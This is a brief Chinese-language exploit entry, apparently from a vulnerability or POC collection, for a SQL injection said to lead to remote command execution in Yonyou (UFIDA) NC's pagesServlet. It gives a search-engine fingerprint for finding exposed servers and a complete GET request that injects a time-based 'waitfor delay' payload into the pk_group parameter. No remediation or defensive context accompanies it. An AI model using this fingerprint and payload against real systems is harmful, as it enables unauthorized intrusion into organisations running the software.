# 用友NCpagesServletSQL注入致RCE漏洞

用友 ｜ 命令执行 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:5'-- HTTP/1.1`